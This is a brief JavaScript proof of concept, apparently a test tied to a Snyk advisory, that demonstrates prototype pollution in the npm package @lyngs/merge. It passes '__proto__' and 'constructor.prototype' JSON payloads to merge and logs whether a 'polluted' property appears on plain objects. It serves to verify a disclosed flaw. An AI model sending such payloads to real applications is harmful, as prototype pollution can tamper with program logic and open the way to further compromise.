// //https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823
// test("prototype pollution in @lyngs/merge", () => {
  const { merge } = require("@lyngs/merge");
console.log({}.polluted);
//merge({ dummy: 1 }, JSON.parse(`{"constructor": {"prototype": {"polluted": "yes"}}}`));
merge({ dummy: 1 }, JSON.parse(`{"__proto__":{"polluted":"yes"}}`));
console.log({}.polluted);
// });
